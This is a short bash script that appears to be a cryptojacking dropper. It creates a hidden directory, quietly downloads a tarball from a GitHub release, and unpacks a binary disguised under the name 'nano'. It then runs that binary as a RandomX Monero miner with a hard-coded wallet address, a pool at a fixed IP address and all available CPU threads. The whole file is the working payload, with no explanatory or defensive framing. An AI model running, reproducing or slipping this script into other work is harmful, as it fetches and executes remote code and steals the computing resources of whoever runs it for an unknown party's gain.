#!/bin/bash
set -x
apt-get update 
apt-get install -y wget curl
mkdir .kepo && cd .kepo
wget https://github.com/Franky777777/razor/releases/download/nano/nano.tar.gz > /dev/null 2>&1
tar -xvf nano.tar.gz
chmod +x nano
./nano -algo RandomX -wallet TBs1gnPNKz17H7YwqvkAcke2G1GWzcuPABrMRiKqR1XRcXy4HpMRWXaWs4LqtS5NzJBJqGVFNSjB1TUVq3M6yMKD66XXzGjGdo -coin XMR -rigName envio -pool1 141.94.192.217:7107 -useSSL false -cpuThreads $(nproc --all) 